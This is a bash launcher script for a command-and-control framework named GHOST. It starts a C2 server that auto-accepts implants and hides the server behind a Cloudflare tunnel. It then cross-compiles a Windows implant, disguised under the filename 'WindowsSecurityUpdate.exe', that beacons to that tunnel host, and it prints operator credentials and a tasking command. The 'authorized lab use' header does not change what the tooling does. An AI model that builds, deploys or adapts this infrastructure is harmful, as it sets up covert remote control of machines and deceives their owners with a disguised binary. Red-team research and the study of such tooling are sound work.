#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  GHOST — one-shot lab launcher (Linux / WSL / lab VM)
#
#  Does everything needed to get an authorized detonation lab online:
#    1. Installs the MinGW-w64 cross-compile toolchain + Python deps + cloudflared
#    2. Generates beacon/operator tokens (shared by the server and the implant)
#    3. Starts the Flask C2 server bound to 127.0.0.1 (never exposed directly)
#    4. Opens a Cloudflare quick tunnel and captures its *.trycloudflare.com host
#    5. Builds the implant with that host baked in as the C2 endpoint
#    6. Prints the operator-CLI command and a stop command
#
#  The tunnel is the ONLY public surface. The quick-tunnel domain is random and
#  unguessable, and the beacon token authenticates the implant — but treat the
#  printed tokens as secrets: anyone with the URL + token can task the implant.
#
#  ⚠ Authorized laboratory use only. Run against systems you own or have
#    written permission to test. See README.md.
#
#  Usage
#    ./lab_up.sh                         # quick tunnel: setup + build + start
#    ./lab_up.sh --no-build              # infra only (skip the implant cross-compile)
#    ./lab_up.sh --rebuild               # reuse existing tunnel/tokens, just rebuild
#    ./lab_up.sh --named c2.example.com  # stable hostname on YOUR Cloudflare zone
#                                        #   (needs a one-time: cloudflared tunnel login)
#    ./lab_up.sh --tunnel-name NAME      # override the named-tunnel name (ghost-c2)
#    ./lab_down.sh                       # stop server + tunnel (also printed at exit)
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ── Tunables (override via environment) ──────────────────────────────────────
C2_BIND="${C2_BIND:-127.0.0.1}"          # keep the origin local; cloudflared fronts it
C2_PORT="${C2_PORT:-8080}"               # local HTTP port the tunnel forwards to
DB_PATH="${DB_PATH:-$SCRIPT_DIR/build/ghost.db}"
ENV_FILE="$SCRIPT_DIR/.lab.env"
SERVER_LOG="$SCRIPT_DIR/build/c2_server.log"
TUNNEL_LOG="$SCRIPT_DIR/build/cloudflared.log"
PID_FILE="$SCRIPT_DIR/build/lab.pids"
IMPLANT_OUT="build/WindowsSecurityUpdate.exe"

# ── Pretty logging ───────────────────────────────────────────────────────────
c_info() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; }
die()    { c_err "$*"; exit 1; }
have()   { command -v "$1" >/dev/null 2>&1; }

SUDO=""
if [[ $EUID -ne 0 ]] && have sudo; then SUDO="sudo"; fi

# ── Tunnel selection ─────────────────────────────────────────────────────────
#   quick : cloudflared quick tunnel — zero login, ephemeral *.trycloudflare.com
#   named : your Cloudflare account + zone — a stable hostname you choose
TUNNEL_MODE="${TUNNEL_MODE:-quick}"
NAMED_HOST="${NAMED_HOST:-}"           # e.g. c2.example.com (must be on your CF zone)
TUNNEL_NAME="${TUNNEL_NAME:-ghost-c2}"

DO_BUILD=1
REBUILD_ONLY=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        --no-build)    DO_BUILD=0; shift ;;
        --rebuild)     REBUILD_ONLY=1; shift ;;
        --named)       TUNNEL_MODE="named"; NAMED_HOST="${2:-}"; shift; if [[ $# -gt 0 ]]; then shift; fi ;;
        --tunnel-name) TUNNEL_NAME="${2:-ghost-c2}"; shift; if [[ $# -gt 0 ]]; then shift; fi ;;
        -h|--help)     sed -n '2,38p' "$0"; exit 0 ;;
        *)             die "unknown argument: $1" ;;
    esac
done
if [[ "$TUNNEL_MODE" == "named" && -z "$NAMED_HOST" ]]; then
    die "--named needs a hostname on your Cloudflare zone, e.g. --named c2.example.com"
fi

mkdir -p build

# ── 1. Dependencies ──────────────────────────────────────────────────────────
if [[ $REBUILD_ONLY -eq 0 ]]; then
    have python3 || die "python3 not found (Debian/Ubuntu: apt-get install python3 python3-pip)"

    if ! have x86_64-w64-mingw32-g++ && [[ $DO_BUILD -eq 1 ]]; then
        c_info "MinGW-w64 toolchain missing — installing via build.sh --setup…"
        $SUDO ./build.sh --setup
    fi

    c_info "Installing Python requirements…"
    python3 -m pip install --quiet --disable-pip-version-check -r server/requirements.txt \
        || $SUDO python3 -m pip install --quiet -r server/requirements.txt \
        || die "pip install failed"

    if ! have cloudflared; then
        c_info "cloudflared not found — installing from the Cloudflare apt repo…"
        if have apt-get; then
            tmpkey="$(mktemp)"
            curl -L --proto '=https' --tlsv1.2 -sS \
                https://pkg.cloudflare.com/cloudflare-main.gpg > "$tmpkey"
            $SUDO mkdir -p /usr/share/keyrings
            codename="$( (lsb_release -cs 2>/dev/null) || grep -oP '^VERSION_CODENAME="\K[a-z]+' /etc/os-release || echo stable)"
            printf 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared %s main\n' \
                "$codename" | $SUDO tee /etc/apt/sources.list.d/cloudflared.list >/dev/null
            $SUDO install -m 644 "$tmpkey" /usr/share/keyrings/cloudflare-main.gpg
            rm -f "$tmpkey"
            $SUDO apt-get update -qq && $SUDO apt-get install -y cloudflared
        fi
        have cloudflared || die "cloudflared still missing — install it manually: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
    fi
    c_ok "Dependencies ready."
fi

# ── 2. Tokens (shared by server + implant; reused across rebuilds) ───────────
if [[ -f "$ENV_FILE" ]]; then
    # shellcheck source=/dev/null
    source "$ENV_FILE"
    if [[ -n "${GHOST_BEACON_TOKEN:-}" ]]; then c_info "Reusing tokens + host from $ENV_FILE"; fi
fi
hex() { python3 -c "import secrets;print(secrets.token_hex($1))"; }
: "${GHOST_BEACON_TOKEN:=$(hex 32)}"
: "${GHOST_OPERATOR_TOKEN:=$(hex 16)}"
: "${GHOST_DASHBOARD_PASS:=$(hex 8)}"

# --rebuild: reuse the tunnel/host already recorded, recompile, and stop.
if [[ $REBUILD_ONLY -eq 1 ]]; then
    [[ -n "${C2_HOST:-}" ]] || die "--rebuild needs a prior run (no C2_HOST in $ENV_FILE)"
    c_info "Rebuilding implant against existing host $C2_HOST …"
    C2_HOST="$C2_HOST" C2_PORT=443 GHOST_BEACON_TOKEN="$GHOST_BEACON_TOKEN" ./build.sh
    [[ -f "$IMPLANT_OUT" ]] || die "build.sh did not produce $IMPLANT_OUT"
    c_ok "Implant rebuilt: $IMPLANT_OUT (beacon token unchanged)."
    exit 0
fi

# ── 3. Start the C2 server (local HTTP only; cloudflared terminates TLS) ──────
c_info "Starting C2 server on http://${C2_BIND}:${C2_PORT} …"
nohup python3 server/c2_server.py \
    --host "$C2_BIND" --port "$C2_PORT" \
    --beacon-token   "$GHOST_BEACON_TOKEN" \
    --operator-token "$GHOST_OPERATOR_TOKEN" \
    --password       "$GHOST_DASHBOARD_PASS" \
    --auto-accept \
    --db "$DB_PATH" \
    > "$SERVER_LOG" 2>&1 &
SERVER_PID=$!

# Wait for the server to answer /health before tunneling to it.
for _ in $(seq 1 30); do
    if curl -fsS "http://${C2_BIND}:${C2_PORT}/health" >/dev/null 2>&1; then break; fi
    kill -0 "$SERVER_PID" 2>/dev/null || { c_err "server exited early:"; tail -n 20 "$SERVER_LOG"; die "C2 server failed to start"; }
    sleep 1
done
c_ok "C2 server up (pid $SERVER_PID)."

# ── 4. Cloudflare tunnel → resolve the C2 host ───────────────────────────────
if [[ "$TUNNEL_MODE" == "named" ]]; then
    # Named tunnel: stable hostname on the operator's own Cloudflare zone.
    # Requires a one-time interactive `cloudflared tunnel login` (opens a browser).
    CF_DIR="$HOME/.cloudflared"
    CERT="$CF_DIR/cert.pem"
    if [[ ! -f "$CERT" ]]; then
        c_info "No Cloudflare origin cert — starting login (finish it in the browser)…"
        cloudflared tunnel login || die "cloudflared tunnel login failed"
    fi
    [[ -f "$CERT" ]] || die "login did not produce $CERT"

    cf_uuid() {   # resolve a tunnel UUID by name via JSON list (empty if absent)
        cloudflared tunnel list --output json 2>/dev/null \
            | python3 -c "import sys,json; d=json.load(sys.stdin); print(next((t['id'] for t in d if t.get('name')=='$TUNNEL_NAME'),''))" 2>/dev/null || true
    }
    TUNNEL_UUID="$(cf_uuid)"
    if [[ -z "$TUNNEL_UUID" ]]; then
        c_info "Creating named tunnel '$TUNNEL_NAME'…"
        cloudflared tunnel create "$TUNNEL_NAME" || die "tunnel create failed"
        TUNNEL_UUID="$(cf_uuid)"
    fi
    [[ -n "$TUNNEL_UUID" ]] || die "could not resolve UUID for tunnel '$TUNNEL_NAME'"
    CREDS="$CF_DIR/$TUNNEL_UUID.json"
    [[ -f "$CREDS" ]] || die "expected credentials at $CREDS"
    c_ok "Named tunnel '$TUNNEL_NAME' = $TUNNEL_UUID"

    c_info "Routing $NAMED_HOST → tunnel (a pre-existing record is fine)…"
    cloudflared tunnel route dns "$TUNNEL_NAME" "$NAMED_HOST" 2>/dev/null \
        || c_warn "route dns returned non-zero (record may already exist) — continuing"

    TUNNEL_CFG="$SCRIPT_DIR/build/cloudflared.yml"
    cat > "$TUNNEL_CFG" <<CFG
tunnel: $TUNNEL_UUID
credentials-file: $CREDS
ingress:
  - hostname: $NAMED_HOST
    service: http://$C2_BIND:$C2_PORT
  - service: http_status:404
CFG
    nohup cloudflared tunnel --no-autoupdate run --config "$TUNNEL_CFG" "$TUNNEL_UUID" > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!
    sleep 3
    if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
        c_err "tunnel exited early:"; tail -n 20 "$TUNNEL_LOG"; die "cloudflared tunnel run failed"
    fi
    C2_HOST="https://$NAMED_HOST"
    TUNNEL_HOST="$NAMED_HOST"
    c_ok "Named tunnel live at $C2_HOST (pid $TUNNEL_PID)."
else
    # Quick tunnel: zero-login, ephemeral *.trycloudflare.com domain.
    c_info "Opening Cloudflare quick tunnel → http://${C2_BIND}:${C2_PORT} …"
    nohup cloudflared tunnel --no-autoupdate \
        --url "http://${C2_BIND}:${C2_PORT}" > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!

    C2_HOST=""
    for _ in $(seq 1 40); do
        C2_HOST="$(grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' "$TUNNEL_LOG" | head -n1 || true)"
        if [[ -n "$C2_HOST" ]]; then break; fi
        if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
            c_err "tunnel exited early:"; tail -n 20 "$TUNNEL_LOG"; die "cloudflared failed to start"
        fi
        sleep 1
    done
    [[ -n "$C2_HOST" ]] || die "timed out waiting for the trycloudflare URL (see $TUNNEL_LOG)"
    TUNNEL_HOST="${C2_HOST#https://}"
    c_ok "Tunnel live at $C2_HOST (pid $TUNNEL_PID)."
fi

# ── 5. Build the implant with the tunnel host baked in ───────────────────────
if [[ $DO_BUILD -eq 1 ]]; then
    c_info "Cross-compiling implant for C2 $TUNNEL_HOST:443 …"
    C2_HOST="$TUNNEL_HOST" C2_PORT=443 \
    GHOST_BEACON_TOKEN="$GHOST_BEACON_TOKEN" \
        ./build.sh
    [[ -f "$IMPLANT_OUT" ]] || die "build.sh did not produce $IMPLANT_OUT"
    c_ok "Implant built: $IMPLANT_OUT"
else
    c_warn "--no-build: skipping implant compile (existing binary unchanged)."
fi

# ── Persist state + write the stopper ────────────────────────────────────────
cat > "$ENV_FILE" <<EOF
# GHOST lab state — generated by lab_up.sh. Safe to edit; reused on next run.
export GHOST_BEACON_TOKEN='$GHOST_BEACON_TOKEN'
export GHOST_OPERATOR_TOKEN='$GHOST_OPERATOR_TOKEN'
export GHOST_DASHBOARD_PASS='$GHOST_DASHBOARD_PASS'
export C2_HOST='$TUNNEL_HOST'
EOF

cat > "$SCRIPT_DIR/lab_down.sh" <<EOF
#!/usr/bin/env bash
# Stop the GHOST lab (server + tunnel) started by lab_up.sh.
cd "\$(dirname "\${BASH_SOURCE[0]}")"
if [[ -f build/lab.pids ]]; then
    while read -r pid name; do
        if kill -0 "\$pid" 2>/dev/null; then kill "\$pid" && echo "[+] stopped \$name (pid \$pid)"; fi
    done < build/lab.pids
    rm -f build/lab.pids
else
    pkill -f 'c2_server.py' && echo '[+] stopped c2_server.py'
    pkill -x cloudflared   && echo '[+] stopped cloudflared'
fi
EOF
chmod +x "$SCRIPT_DIR/lab_down.sh"

printf '%s\n' "$SERVER_PID server" "$TUNNEL_PID cloudflared" > "$PID_FILE"

# ── 6. Summary ───────────────────────────────────────────────────────────────
cat <<EOF

╔══════════════════════════════════════════════════════════════════════════╗
║  GHOST lab is ONLINE                                                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║  C2 endpoint (implant) : $C2_HOST
║  Local origin          : http://${C2_BIND}:${C2_PORT}   (loopback only)
║  Web dashboard         : $C2_HOST   (user: admin)
╠══════════════════════════════════════════════════════════════════════════╣
║  Beacon token          : $GHOST_BEACON_TOKEN
║  Operator token        : $GHOST_OPERATOR_TOKEN
║  Dashboard password    : $GHOST_DASHBOARD_PASS
╠══════════════════════════════════════════════════════════════════════════╣
║  Implant binary        : $IMPLANT_OUT
║  Logs                  : $SERVER_LOG
║                            $TUNNEL_LOG
╚══════════════════════════════════════════════════════════════════════════╝

  Attach as operator:
    python3 server/c2_cli.py --url $C2_HOST --token $GHOST_OPERATOR_TOKEN

  Stop everything:
    ./lab_down.sh

  NOTE: quick-tunnel URLs are ephemeral — if cloudflared restarts it gets a NEW
        domain, so rebuild the implant (./lab_up.sh --rebuild). A named tunnel
        (--named) keeps a stable hostname, so the implant survives restarts.
EOF
